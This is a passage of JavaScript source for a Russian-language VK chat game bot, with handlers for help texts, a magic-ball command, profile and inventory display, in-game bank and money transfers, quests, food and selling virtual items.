		return message.send(`С помощью команды "Работа" вы можете устроиться на одну из работ. Чтобы отрыть новые профессии, вам нужно отработать определённое кол-во игровых недель (Команда "Работать"). Для увольнения с работы введите "Уволиться".`);
	}

	if(message.args[1] === 'бизнес')
	{
		return message.send(`Владея бизнесом, вы можете зарабатывать немало денег:
		Бизнесы [номер] - купить бизнес
		Бизнес - ваш бизнес
		Бизнес снять - снять деньги со счёта бизнеса
		Продать бизнес - продажа бизнеса`);
	}

	if(message.args[1] === 'реши')
	{
		return message.send(`Команда "Реши" решает ваш пример (Реши 5 + 5).
		Команда умеет:
		Складывать (+)
		Вычитать (-)
		Умножать (*)
		Делить (/)`);
	}

	if(message.args[1] === 'курс')
	{
		return message.send(`С помощью команды "Курс" можно узнать курс Биткоина на данный момент.`);
	}

	if(message.args[1] === 'профиль')
	{
		return message.send(`Команда "Профиль" выводит вашу игровую статистику.`);
	}

	if(message.args[1] === 'баланс')
	{
		return message.send(`Команда "Баланс" выводит кол-во валюты на вашем аккаунте.`);
	}

	if(message.args[1] === 'банк')
	{
		return message.send(`При вводе команды "Банк" (без параметров) выводится ваша сумма на счёте. Для того чтобы положить на счёт деньги введите "Банк [сумма]" (Максимум 250.000.000.000$). Чтобы забрать деньги из банка введите "Банк снять/взять [сумма]".
		Сумма в банке увеличивается каждый час (больше сумма - больше прибыль).`);
	}

	if(message.args[1] === 'рейтинг')
	{
		return message.send(`Пустая команда "Рейтинг" (без параметров) выводит ваше кол-во рейтинга (также можно узнать в профиле). При указании параметра (любое число) вы купите данное кол-во единиц рейтинга (👑1 = 250.000.000$). Рейтинг влияет на ваше положение в топе.`);
	}

	if(message.args[1] === 'ник')
	{
		return message.send(`С помощью команды "Ник" можно выбрать себе ник длинною до 15 символов. Также, ник можно делать кликабельным/некликабельным в топе "Ник вкл" и "Ник выкл"`);
	}

	if(message.args[1] === 'магазин')
	{
		return message.send(`Команда "Магазин" выводит список категорий товаров, которые доступны для покупки.`);
	}

	if(message.args[1] === 'продать')
	{
		return message.send(`С помощью команды "Продать" вы можете продать любой предмет (Машину, дом, квартиру, телефон, яхту, самолет, вертолет, биткоин, ферму).`);
	}

	if(message.args[1] === 'передать')
	{
		return message.send(`Команда "Передать" переводит указанную вами сумму любому игроку (Передать ${message.user.uid} 1000).`);
	}

	if(message.args[1] === 'топ')
	{
		return message.send(`Команда "Топ" выводит 10 игроков с самым большим рейтингом.`);
	}

	if(message.args[1] === 'дата')
	{
		return message.send(`Команда "Дата" выводит дату регистрации человека в боте. Можно использовать id человека.`);
	}

	if(message.args[1] === 'репорт')
	{
		return message.send(`С помощью команды "Репорт" вы можете отправить создателю бота любое сообщение. Также можно использовать "Реп", "Жалоба", "Rep".`);
	}
});

cmd.hear(/^(?:переверни)\s([^]+)$/i, async (message, bot) => {
	let text = ``;
	message.args[1].split('').map(x=> {
		if(rotateText[x])
		{
			text += rotateText[x];
		}
	});

	return bot(`держи : "${text.split('').reverse().join('')}"`)
});

cmd.hear(/^(?:шар)\s([^]+)$/i, async (message, bot) => {
	const phrase = utils.pick(['перспективы не очень хорошие', 'сейчас нельзя предсказать', 'пока не ясно', 'знаки говорят - "Да"', 'знаки говорят - "Нет"', 'можешь быть уверен в этом', 'мой ответ - "нет"', 'мой ответ - "да"', 'бесспорно', 'мне кажется - "Да"', 'мне кажется - "Нет"']);
	return bot(phrase);
});

cmd.hear(/^(?:инфа|шанс|вероятность)\s([^]+)$/i, async (message, bot) => {
	const phrase = utils.pick(['шанс этого', 'мне кажется около']);
	const percent = utils.random(100);

	return bot(`${phrase} ${percent}%`)
});

cmd.hear(/^(?:выбери)\s([^]+)\s(?:или)\s([^]+)$/i, async (message, bot) => {
	const first = message.args[1];
	const second = message.args[2];

	const phrase = utils.pick([`конечно ${utils.random(1, 2)} вариант`, `мне кажется, что ${utils.random(1, 2)} вариант лучше`]);
	return bot(`${phrase}`);
});

cmd.hear(/^(?:профиль)$/i, async (message, bot) => {
	let text = ``;

	text += `[💬]Ваш игровой ID:  ${message.user.uid}\n`;
	text += `[🍗]Состояние голода:  ${message.user.golod}\n`;
	if(message.user.transport.strana) text += `[♦]Страна: ${stranas[message.user.transport.strana - 1].name}\n`;
	text += `[💰]Наличка:  ${utils.sp(message.user.balance)}$\n`;
	text += `[💳]Деньги в банке:  ${utils.sp(message.user.bank)}$\n`;
	text += `[🌐]Биткоинов:  ${utils.sp(message.user.btc)}\n`;
	if(message.user.transport.pitom) text += `[🐓]Питомец:  ${pitoms[message.user.transport.pitom - 1].name}\n`;
	text += `[👑]Рейтинг:  ${utils.sp(message.user.rating)}\n`;
	if(message.user.work) text += `👔Работа: ${works[message.user.work - 1].name}\n`;
	text += `[⚡]Уровень:  ${message.user.level} [${message.user.exp}/24]\n`;

	text += `\n📗 📍Наш сайт:vk.com/roman_akularbot.ml`;
	text += `\n📗 📍Наша группа:vk.com/vk.com/roman_akular_bot`;
	text += `\n📗 Дата регистрации: ${message.user.regDate}`;
	return bot(`твой профиль:\n${text}`);
});

cmd.hear(/^(?:персонаж)$/i, async (message, bot) => {
	
	    let text = ``;
		if(message.user.transport.car || message.user.transport.yacht || message.user.transport.golova || message.user.transport.airplane || message.user.transport.helicopter || message.user.transport.telik ||
		message.user.realty.home || message.user.realty.apartment ||
		message.user.misc.phone || message.user.misc.farm || message.user.transport.table || message.user.transport.moto || message.user.transport.copter || message.user.business)		
				
		if(message.user.transport.shlapa) text +=`${shlapas[message.user.transport.shlapa - 1].name}\n`;
		if(message.user.transport.golova) text += `${golovas[message.user.transport.golova - 1].name}\n`;
		if(message.user.transport.rubahka) text += `${rubahkas[message.user.transport.rubahka - 1].name}\n`;
		text += `👖Gucci\n`;
		if(message.user.transport.obyv) text += `${obyvs[message.user.transport.obyv - 1].name}\n`;

		return bot(`Твой персонаж:\n${text}`);
});

cmd.hear(/^(?:Получить паспорт)$/i, async (message, bot) => {
	let prize = utils.pick([1]);
	if(message.user.transport.passp > 1) return bot(`У вас уже есть паспорт!`);

	if(prize === 1)
	{
		message.user.transport.passp = 4;
		return bot(`[🎫]Вы успешно получили паспорт`);
	}
});

cmd.hear(/^(?:имущество)$/i, async (message, bot) => {
	
	    let text = ``;
		if(message.user.transport.car || message.user.transport.yacht || message.user.transport.golova || message.user.transport.airplane || message.user.transport.helicopter || message.user.transport.telik ||
		message.user.realty.home || message.user.realty.apartment ||
		message.user.misc.phone || message.user.misc.farm || message.user.transport.table || message.user.transport.moto || message.user.transport.copter || message.user.business)		
				
		if(message.user.transport) text += `\nТранспорт: \n`;
		if(message.user.transport.moto) text += `🛵Мотоцикл:  ${motos[message.user.transport.moto - 1].name}\n`;
		if(message.user.transport.car) text += `🚙Машина: ${cars[message.user.transport.car - 1].name}\n`;
		if(message.user.transport.yacht) text += `⛵Яхта:  ${yachts[message.user.transport.yacht - 1].name}\n`;
		if(message.user.transport.airplane) text += `✈Самолет:  ${airplanes[message.user.transport.airplane - 1].name}\n`;
		if(message.user.transport.helicopter) text += `🚁Вертолет: ${helicopters[message.user.transport.helicopter - 1].name}\n`;
		
		text += `\nИмущество: \n`;
		
		if(message.user.realty.home) text += `⛪Дом:  ${homes[message.user.realty.home - 1].name}\n`;
		if(message.user.realty.apartment) text += `🌇 Квартира: ${apartments[message.user.realty.apartment - 1].name}\n`;
		if(message.user.misc.farm) text += `🚣Ферма: ${farms[message.user.misc.farm - 1].name}\n`;
		if(message.user.business) text += `${businesses[message.user.business - 1].icon} ${businesses[message.user.business - 1].name}\n`;
		
		text += `\nГаджеты: \n`;

		if(message.user.transport.table) text += `💻Планшет:  ${tables[message.user.transport.table - 1].name}\n`;
		if(message.user.misc.phone) text += `📱Телефон:  ${phones[message.user.misc.phone - 1].name}\n`;
		if(message.user.transport.telik) text += `📺Телевизор:  ${teliks[message.user.transport.telik - 1].name}\n`;
		if(message.user.transport.fotik) text += `📷Фотоаппарат:  ${fotiks[message.user.transport.fotik - 1].name}\n`;
		if(message.user.transport.cam) text += 	`📽Камера:  ${cams[message.user.transport.cam - 1].name}\n`;
		if(message.user.transport.copter) text += `🚡КвадроКоптер:  ${copters[message.user.transport.copter - 1].name}\n`;
		return bot(`Твое Имущество:\n${text}`);
});



cmd.hear(/^(?:квесты)$/i, async (message, bot) => {
	
	let text = ``;
    text += `1⃣Получаем паспорт.Награда:10$💰\n`;
	if(message.user.transport.questb) text += `Состояние: ${questbs[message.user.transport.questb - 1].name}\n`;
		text += `||---------------------------------------------------------||\n`;
		text += `2⃣Первая работа.Награда:20$💰\n`;
	if(message.user.transport.questbb) text += `Состояние: ${questbbs[message.user.transport.questbb - 1].name}\n`;
		text += `||---------------------------------------------------------||\n`;
	text += `3⃣Расширяем границы.Награда:Питомец тигр🐅\n`;
	if(message.user.transport.questbbb) text += `Состояние: ${questbbbs[message.user.transport.questbbb - 1].name}\n`;
		text += `||---------------------------------------------------------||\n`;
	text += `4⃣Будь всегда на свзяи.Награда:Планшет💻\n`;
	if(message.user.transport.questbbbb) text += `Состояние: ${questbbbbs[message.user.transport.questbbbb - 1].name}\n`;
		text += `||---------------------------------------------------------||\n`;
	text += `5⃣Дом,милый дом.Награда:100$💰\n`;
	if(message.user.transport.questbbbbb) text += `Состояние: ${questbbbbbs[message.user.transport.questbbbbb - 1].name}\n`;
		text += `⠀⠀\n`;
	text += `🔷Для того что бы начать квест,нужно ввести: "Квест [номер]"Пример:Квест 11🔷\n`;

	
	return bot(`Список квестов:\n${text}`);
});

cmd.hear(/^(?:баланс)$/i, async (message, bot) => {
	let text = `💰Наличка: ${utils.sp(message.user.balance)}$\n💵 Деньги в банке: ${utils.sp(message.user.bank)}$`;
	if(message.user.btc) text += `\n🌐 Биткоинов: ${utils.sp(message.user.btc)}฿`;

	return bot(text);
});

cmd.hear(/^(?:банк)$/i, async (message, bot) => {
	return bot(`на вашем банковском счёте находится ${utils.sp(message.user.bank)}$`);
});

cmd.hear(/^(?:банк)\s(?:снять)\s(.*)$/i, async (message, bot) => {
	message.args[1] = message.args[1].replace(/(\.|\,)/ig, '');
	message.args[1] = message.args[1].replace(/(к|k)/ig, '000');
	message.args[1] = message.args[1].replace(/(м|m)/ig, '000000');
	message.args[1] = message.args[1].replace(/(вабанк|вобанк|все|всё)/ig, message.user.bank);

	if(!Number(message.args[1])) return;
	message.args[1] = Math.floor(Number(message.args[1]));

	if(message.args[1] <= 0) return;

	if(message.args[1] > message.user.bank) return bot(`❗У вас нет данной суммы`);
	else if(message.args[1] <= message.user.bank)
	{
		message.user.balance += message.args[1];
		message.user.bank -= message.args[1];

		return bot(`💵Вы успешно сняли: ${utils.sp(message.args[1])}$
💳 Новый баланс в банке: ${utils.sp(message.user.bank)}$
💰 Ваш баланс: ${utils.sp(message.user.balance)}$`);
	}
});

cmd.hear(/^(?:банк)\s(.*)$/i, async (message, bot) => {
	message.args[1] = message.args[1].replace(/(\.|\,)/ig, '');
	message.args[1] = message.args[1].replace(/(к|k)/ig, '000');
	message.args[1] = message.args[1].replace(/(м|m)/ig, '000000');
	message.args[1] = message.args[1].replace(/(вабанк|вобанк|все|всё)/ig, message.user.balance);

	if(!Number(message.args[1])) return;
	message.args[1] = Math.floor(Number(message.args[1]));

	if(message.args[1] <= 0) return;
	if(message.args[1] <= 49) return bot(`минимальная сумма вклада 50$`);
	if(message.args[1] > 9999999999999991413413413413314139999999999) return bot(`максимальная сумма вклада &$`);

	if(message.args[1] > message.user.balance) return bot(`❗У вас нет данной суммы`);
	else if(message.args[1] <= message.user.balance)
	{
		message.user.balance -= message.args[1];
		message.user.bank += message.args[1];

		return bot(`вы положили на свой банковский счёт ${utils.sp(message.args[1])}$`);
	}
});

cmd.hear(/^(?:уведомления)\s(выкл|вкл)$/i, async (message, bot) => {
	if(message.args[1].toLowerCase() === 'выкл')
	{
		message.user.notifications = false;
		return bot(`уведомления отключены! 🔕`);
	}

	if(message.args[1].toLowerCase() === 'вкл')
	{
		return bot(`уведомления включены! 🔔`);
	}
});

cmd.hear(/^(?:передать)\s([0-9]+)\s(.*)$/i, async (message, bot) => {
	message.args[2] = message.args[2].replace(/(\.|\,)/ig, '');
	message.args[2] = message.args[2].replace(/(к|k)/ig, '000');
	message.args[2] = message.args[2].replace(/(м|m)/ig, '000000');
	message.args[2] = message.args[2].replace(/(вабанк|вобанк|все|всё)/ig, message.user.balance);
	
	if(message.args[2] <= 0) return;
	if(message.args[2] <= 1000) return bot(`минимальная сумма перевода 1000$`);
	if(message.args[2] > 10000000) return bot(`максимальная сумма перевода 10000000$`);

	if(!Number(message.args[2])) return;
	message.args[2] = Math.floor(Number(message.args[2]));

	if(message.args[2] <= 0) return;

	if(message.args[2] > message.user.balance) return bot(`❗недостаточно денег
💰 Баланс: ${utils.sp(message.user.balance)}$`);
	else if(message.args[2] <= message.user.balance)
	{
		let user = users.find(x=> x.uid === Number(message.args[1]));
		if(!user) return bot(`неверный ID игрока`);

		if(user.uid === message.user.uid) return bot(`неверный ID`);
		
		message.user.balance -= message.args[2];
		user.balance += message.args[2];

		await bot(`вы передали игроку ${user.tag} ${utils.sp(message.args[2])}$`);
		if(user.notifications) vk.api.messages.send({ user_id: user.id, message: `[УВЕДОМЛЕНИЕ]
▶ Игрок ${message.user.tag} перевел вам ${utils.sp(message.args[2])}$!
🔕 Введите "Уведомления выкл", если не хотите получать подобные сообщения` });
	}
});

cmd.hear(/^(?:мой рейтинг)$/i, async (message, bot) => {
	return bot(`ваш рейтинг: ${utils.sp(message.user.rating)}👑`);
});

cmd.hear(/^(?:ник)\s(вкл|выкл)$/i, async (message, bot) => {
	if(message.args[1].toLowerCase() === 'вкл')
	{
		message.user.mention = true;
		return bot(`гиперссылка включена!`);
	}

	if(message.args[1].toLowerCase() === 'выкл')
	{
		message.user.mention = false;
		return bot(`гиперссылка отключена!`);
	}
});

cmd.hear(/^(?:ник)\s(.*)$/i, async (message, bot) => {
	if(message.args[1].length >= 16) return bot(`максимальная длина ника 15 символов`);

	message.user.tag = message.args[1];
	return bot(`вы теперь "${message.user.tag}"`);
});

cmd.hear(/^(?:Страны)$/i, async (message, bot) => {
	return bot(`Список стран:

	1.❓Не указана
	2.🇺🇸США
	3.🇷🇺Россия
	4.🇰🇷Япония
	5.🇺🇦Украина
	6.🇰🇿Казахстан
	7.🇧🇾Белоруссия
	
	Для выбора страны проживания введите:Страна [номер]
	
	‼ВНИМАНИЕ‼ ЗА ОСКОРБЛЕНИЕ НАЦИИ,БУДЕТ ВЫДАН БАН И ОБНУЛЕНИЯ АККАУНТА‼ Если увидели нарушения правила пишите суда:vk.com/roman_alular ‼
	
	📗📍Наш сайт:vk.com/roman_akularbot.ml
	📗📍Наша группа:vk.com/vk.com/roman_akular_bot

`);
});

cmd.hear(/^(?:Квест 1)$/i, async (message, bot) => {
	if(message.user.transport.questb < 1) return bot(`Квест уже выполнен!`);
	let prize = utils.pick([1]);

	if(prize === 1)
	{
		message.user.vipquest = 1;
	}
	return bot(`[📕]Вы успешно взяли квест.Для выполнения вам нужно получить паспорт: "получить паспорт".Что-бы забрать награду введите "Завершить квест 1"[💰]Награда:10$`);
});

cmd.hear(/^(?:Квест 3)$/i, async (message, bot) => {
	if(message.user.transport.questbbb < 1) return bot(`Квест уже выполнен!`);
	let prize = utils.pick([1]);

	if(prize === 1)
	{
		message.user.vipquest = 1;
	}
	return bot(`[📕]Вы успешно взяли квест.Для выполнения вам нужно исследовать лес: "исследовать.Что-бы забрать награду введите "Завершить квест 3"
[💰]Награда:Питомец тигр[5]`);
});

cmd.hear(/^(?:Квест 4)$/i, async (message, bot) => {
	if(message.user.transport.questbbbb < 1) return bot(`Квест уже выполнен!`);
	let prize = utils.pick([1]);

	if(prize === 1)
	{
		message.user.vipquest = 1;
	}
	return bot(`[📕]Вы успешно взяли квест.Для выполнения вам нужно купить телефоны: "телефоны [номер].Что-бы забрать награду введите "Завершить квест 4"
[💰]Награда:Планшет Samsung[1]`);
});

cmd.hear(/^(?:Квест 5)$/i, async (message, bot) => {
	if(message.user.transport.questbbbbb < 1) return bot(`Квест уже выполнен!`);
	let prize = utils.pick([1]);

	if(prize === 1)
	{
		message.user.vipquest = 1;
	}
	return bot(`[📕]Вы успешно взяли квест.Для выполнения вам нужно купить дом: "Дом[номер].Что-бы забрать награду введите "Завершить квест 5"
[💰]Награда:100$`);
});

cmd.hear(/^(?:Квест 2)$/i, async (message, bot) => {
	if(message.user.transport.questbb < 1) return bot(`Квест уже выполнен!`);
	let prize = utils.pick([1]);

	if(prize === 1)
	{
		message.user.vipquest = 1;
	}
	return bot(`[📕]Вы успешно взяли квест.Для выполнения вам нужно устроиться на работы: "работа [номер].Что-бы забрать награду введите "Завершить квест 2"
[💰]Награда:20$`);
});

cmd.hear(/^(?:Страна 2)$/i, async (message, bot) => {
	let prize = utils.pick([1]);

	if(prize === 1)
	{
		message.user.transport.strana = 2;
		return bot(`‼Вы успешно сменили страну проживания.‼Напоминаем:за оскорбление наций будет выдан бан.‼`);
	}
});


cmd.hear(/^(?:Завершить квест 1)$/i, async (message, bot) => {
	if(!message.user.transport.passp) return bot(`Вы не получили паспорт`);
	if(message.user.questwin1 > 1) return bot(`Квест уже завершен!`);
	let prize = utils.pick([1]);
	if(prize === 1)
	{
		message.user.balance += 10;
		message.user.questwin1 += 2;
		message.user.vipquest = 0;
		message.user.transport.questb = 1;
		return bot(`[👾]Вы успешно выполнили квест!
[💰]Ваша награда:10$
`);
	}
});

cmd.hear(/^(?:Завершить квест 5)$/i, async (message, bot) => {
	if(!message.user.realty.home) return bot(`Вы не купили дом!`);
	if(message.user.questwin5 > 1) return bot(`Квест уже завершен!`);
	let prize = utils.pick([1]);
	if(prize === 1)
	{
		message.user.balance += 100;
		message.user.questwin5 += 2;
		message.user.vipquest = 0;
		message.user.transport.questbbbbb = 1;
		return bot(`[👾]Вы успешно выполнили квест!
[💰]Ваша награда:100$
`);
	}
});

cmd.hear(/^(?:Завершить квест 4)$/i, async (message, bot) => {
	if(!message.user.misc.phone) return bot(`Купите телефон что бы завершить квест!`);
	if(message.user.questwin4 > 1) return bot(`Квест уже завершен!`);
	let prize = utils.pick([1]);
	if(prize === 1)
	{
		message.user.transport.table = 1;
		message.user.questwin4 += 2;
		message.user.vipquest = 0;
		message.user.transport.questbbbb = 1;
		return bot(`[👾]Вы успешно выполнили квест!
[💰]Ваша награда:Планшет Samsung[1]
`);
	}
});

cmd.hear(/^(?:Завершить квест 3)$/i, async (message, bot) => {
	if(message.user.islquest < 0) return bot(`Вы еще не исследовали лес.`);
	if(message.user.questwin3 > 1) return bot(`Квест уже завершен!`);
	let prize = utils.pick([1]);
	if(prize === 1)
	{
		message.user.questwin3 += 2;
		message.user.vipquest = 0;
		message.user.transport.pitom = 5;
		message.user.transport.questbbb = 1;
		return bot(`[👾]Вы успешно выполнили квест!
[💰]Ваша награда:Питомец тигр[5]
`);
	}
});

cmd.hear(/^(?:Завершить квест 2)$/i, async (message, bot) => {
	if(!message.user.work) return bot(`Вы не устроились на работу!`);
	if(message.user.questwin2 > 1) return bot(`Квест уже завершен!`);
	let prize = utils.pick([1]);
	if(prize === 1)
	{
		message.user.balance += 20;
		message.user.questwin2 += 2;
		message.user.vipquest = 0;
		message.user.transport.questbb = 1;
		return bot(`[👾]Вы успешно выполнили квест!
[💰]Ваша награда:20$
`);
}
});



cmd.hear(/^(?:Еда 1)$/i, async (message, bot) => {
	if(message.user.timers.edae) return bot(`Есть можно 1 раз в 10 минут!`);
	if(message.user.golod > 90) return bot(`Ваш персонаж не голоден.`);
	if(message.user.balance < 10) return bot(`У вас недостаточно денег.`);
	let prize = utils.pick([1]);

	setTimeout(() => {
		message.user.timers.edae = false;
	}, 600000);

	message.user.timers.edae = true;

	if(prize === 1)
	{
		message.user.golod +=30;
		message.user.balance -=10;
		return bot(`[🍗]Вы успешно перекусили!`);
	}
});

cmd.hear(/^(?:Еда 2)$/i, async (message, bot) => {
	if(message.user.timers.edae) return bot(`Есть можно 1 раз в 10 минут!`);
	if(message.user.golod > 90) return bot(`Ваш персонаж не голоден.`);
	if(message.user.balance < 20) return bot(`У вас недостаточно денег.`);
	let prize = utils.pick([1]);

	setTimeout(() => {
		message.user.timers.edae = false;
	}, 600000);

	message.user.timers.edae = true;

	if(prize === 1)
	{
		message.user.golod +=50;
		message.user.balance -=20;
		return bot(`[🍗]Вы успешно перекусили!`);
	}
});

cmd.hear(/^(?:Еда 3)$/i, async (message, bot) => {
	if(message.user.timers.edae) return bot(`Есть можно 1 раз в 10 минут!`);
	if(message.user.golod > 90) return bot(`Ваш персонаж не голоден.`);
	if(message.user.balance < 50) return bot(`У вас недостаточно денег.`);
	let prize = utils.pick([1]);
	
		setTimeout(() => {
		message.user.timers.edae = false;
	}, 600000);

	message.user.timers.film = true;

	if(prize === 1)
	{
		message.user.golod +=100;
		message.user.balance -=50;
		return bot(`[🍗]Вы успешно перекусили!`);
	}
});

cmd.hear(/^(?:Список еды)$/i, async (message, bot) => {
	return bot(`Меню:

1.&#127828;Бургер-10$ (+20очков голода)
2.&#127834;Кортошка с катлетой-20$ (+50очков голода)
3.&#127837;Запиканка-50$ (+100очков голода)

Для выбора введите "Еда [номер]" пример: Еда 1.
Если ваш персонжа будет голоден,вы не сможете работать!

`);
});




cmd.hear(/^(?:магазин)$/i, async (message, bot) => {
	return bot(`Магазин🛒:

Транспорт:🏎
Машины [Номер]🚗
Вертолеты [Номер]🚁
Самолеты [Номер]🛩
Яхты [Номер]⛴
Мотоциклы [Номер]🏍

Имущество:💼
Бизнесы [Номер]🕋
Дом [Номер]🏡

Гаджеты:🕹
Планшеты [Номер]💻
Телефоны  [Номер]📱
Квадрокоптеры [Номер]🚡
Телевизоры [Номер]📺
Камеры [Номер]📹
Фотоаппараты [Номер]📷

Персонаж:🎅
Головы [Номер]😈
Рубашки [Номер]👕
Обувь [Номер]👞
Шляпы [Номер]⛑

Прочее:📍
Фермы  [Номер]🚣
Рейтинг [коло-во]👑
Биткоины [коло-во]💎
Питомцы [Номер]🦊

📗📍Наш сайт:vk.com/roman_akularbot.ml
📗📍Наша группа:vk.com/vk.com/roman_akular_bot

🔎 Для покупки используйте "[категория] [номер]".
⠀ ⠀ Например: "${utils.pick(['Телефон 7', 'Машина 1', 'Ферма 2', 'Биткоин 100', 'Рейтинг 10'])}"`);
});


cmd.hear(/^(?:бот)$/i, async (message, bot) =>{
		let dev = '';   
		return bot(`Информация о боте:
			📗📍 ➾ Проект: vk.com/roman_akular
			📗📍 ➾ Версия: 5.1
			📗📍 ➾ Создатель: vk.com/roman_akular
			📗📍 ➾ Сайт:vk.com/roman_akularbot.ml
			📗📍 ➾ Группа:vk.com/vk.com/roman_akular_bot
			`);
	});
 

cmd.hear(/^(?:продать)\s(.*)\s?(.*)?$/i, async (message, bot) => {
	let options = {
		count: null
	}

	message.args[2] = message.args[1].split(' ')[1];

	if(!message.args[2]) options.count = 1;
	if(message.args[2])
	{
		message.args[2] = message.args[2].replace(/(\.|\,)/ig, '');
		message.args[2] = message.args[2].replace(/(к|k)/ig, '000');
		message.args[2] = message.args[2].replace(/(м|m)/ig, '000000');

		message.args[2] = Math.floor(Number(message.args[2]));
		if(message.args[2] <= 0) return;

		if(!message.args[2]) options.count = 1;
		else if(message.args[2]) options.count = message.args[2];
	}
	
	if(/квадрокоптер/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.transport.copter) return bot(`❗у вас нет Квадрокоптера`);
		let a = Math.floor(copters[message.user.transport.copter - 1].cost * 0.85);

		message.user.balance += Math.floor(copters[message.user.transport.copter - 1].cost * 0.85);
		message.user.transport.copter = 0;

		return bot(`вы продали свой квадрокоптер за ${utils.sp(a)}$`);
	}

	if(/Телевизор/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.transport.telik) return bot(`❗у вас нет телевизора`);
		let a = Math.floor(teliks[message.user.transport.telik - 1].cost * 0.85);

		message.user.balance += Math.floor(teliks[message.user.transport.telik - 1].cost * 0.85);
		message.user.transport.telik = 0;

		return bot(`вы продали свой телевизор за ${utils.sp(a)}$`);
	}
	
	if(/Питомец/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.transport.pitom) return bot(`❗у вас нет питомца`);
		let a = Math.floor(pitoms[message.user.transport.pitom - 1].cost * 0.85);

		message.user.balance += Math.floor(pitoms[message.user.transport.pitom - 1].cost * 0.85);
		message.user.transport.pitom = 0;

		return bot(`вы продали своего питомца за ${utils.sp(a)}$`);
	}
	
		if(/Голова/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.transport.golova) return bot(`❗У вашего персонажа нет головы.`);
		let a = Math.floor(golovas[message.user.transport.golova - 1].cost * 0.85);

		message.user.balance += Math.floor(golovas[message.user.transport.golova - 1].cost * 0.85);
		message.user.transport.golova = 0;

		return bot(`Вы продали голову за ${utils.sp(a)}$`);
	}
	
		if(/Рубашка/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.transport.rubahka) return bot(`❗У вашего персонажа нет рубишки.`);
		let a = Math.floor(rubahkas[message.user.transport.rubahka - 1].cost * 0.85);

		message.user.balance += Math.floor(rubahkas[message.user.transport.rubahka - 1].cost * 0.85);
		message.user.transport.rubahka = 0;

		return bot(`Вы продали рубашку за ${utils.sp(a)}$`);
	}
	
		if(/Обувь/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.transport.obyv) return bot(`❗У вашего персонажа нет обуви.`);
		let a = Math.floor(obyvs[message.user.transport.obyv - 1].cost * 0.85);

		message.user.balance += Math.floor(obyvs[message.user.transport.obyv - 1].cost * 0.85);
		message.user.transport.obyv = 0;

		return bot(`Вы продали обувь за ${utils.sp(a)}$`);
	}

	if(/Фотоаппарат/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.transport.fotik) return bot(`❗у вас нет Фотоаппарата`);
		let a = Math.floor(fotiks[message.user.transport.fotik - 1].cost * 0.85);

		message.user.balance += Math.floor(fotiks[message.user.transport.fotik - 1].cost * 0.85);
		message.user.transport.fotik = 0;

		return bot(`вы продали свой Фотоаппарат за ${utils.sp(a)}$`);
	}

	if(/камер(ы|а|у)/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.transport.cam) return bot(`❗у вас нет камеры`);
		let a = Math.floor(cams[message.user.transport.cam - 1].cost * 0.85);

		message.user.balance += Math.floor(cams[message.user.transport.cam - 1].cost * 0.85);
		message.user.transport.cam = 0;

		return bot(`вы продали свою камеру за ${utils.sp(a)}$`);
	}

	if(/Шляпа/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.transport.shlapa) return bot(`❗У вашего персонажа нет шляпы.`);
		let a = Math.floor(shlapas[message.user.transport.shlapa - 1].cost * 0.85);

		message.user.balance += Math.floor(shlapas[message.user.transport.shlapa - 1].cost * 0.85);
		message.user.transport.shlapa = 0;

		return bot(`Вы продали шляпу за ${utils.sp(a)}$`);
	}

	if(/Мотоцикл/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.transport.moto) return bot(`❗у вас нет мотоцикла`);
		let a = Math.floor(motos[message.user.transport.moto - 1].cost * 0.85);

		message.user.balance += Math.floor(motos[message.user.transport.moto - 1].cost * 0.85);
		message.user.transport.moto = 0;

		return bot(`вы продали свой мотоцикл за ${utils.sp(a)}$`);
	}
	
	if(/Планшет/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.transport.table) return bot(`❗у вас нет планшета`);
		let a = Math.floor(tables[message.user.transport.table - 1].cost * 0.85);

		message.user.balance += Math.floor(tables[message.user.transport.table - 1].cost * 0.85);
		message.user.transport.table = 0;

		return bot(`вы продали свой планшет за ${utils.sp(a)}$`);
	}
	
	if(/машин/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.transport.car) return bot(`❗у вас нет машины`);
		let a = Math.floor(cars[message.user.transport.car - 1].cost * 0.85);

		message.user.balance += Math.floor(cars[message.user.transport.car - 1].cost * 0.85);
		message.user.transport.car = 0;

		return bot(`вы продали свою машину за ${utils.sp(a)}$`);
	}

	if(/яхт/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.transport.yacht) return bot(`❗у вас нет яхты`);
		let a = Math.floor(yachts[message.user.transport.yacht - 1].cost * 0.85);

		message.user.balance += Math.floor(yachts[message.user.transport.yacht - 1].cost * 0.85);
		message.user.transport.yacht = 0;

		return bot(`вы продали свою яхту за ${utils.sp(a)}$`);
	}

	if(/самол(е|ё|йо)т/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.transport.airplane) return bot(`❗у вас нет самолёта`);
		let a = Math.floor(airplanes[message.user.transport.airplane - 1].cost * 0.85);

		message.user.balance += Math.floor(airplanes[message.user.transport.airplane - 1].cost * 0.85);
		message.user.transport.airplane = 0;

		return bot(`вы продали свой самолёт за ${utils.sp(a)}$`);
	}

	if(/в(и|е|я)рт(а|о)л(е|ё|йо)т/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.transport.helicopter) return bot(`❗у вас нет вертолета`);
		let a = Math.floor(helicopters[message.user.transport.helicopter - 1].cost * 0.85);

		message.user.balance += Math.floor(helicopters[message.user.transport.helicopter - 1].cost * 0.85);
		message.user.transport.helicopter = 0;

		return bot(`вы продали свой вертолёт за ${utils.sp(a)}$`);
	}

	if(/дом/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.realty.home) return bot(`❗у вас нет дома`);
		let a = Math.floor(homes[message.user.realty.home - 1].cost * 0.85);

		message.user.balance += Math.floor(homes[message.user.realty.home - 1].cost * 0.85);
		message.user.realty.home = 0;

		return bot(`вы продали свой дом за ${utils.sp(a)}$`);
	}

	if(/квартир/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.realty.apartment) return bot(`❗у вас нет квартиры`);
		let a = Math.floor(apartments[message.user.realty.apartment - 1].cost * 0.85);

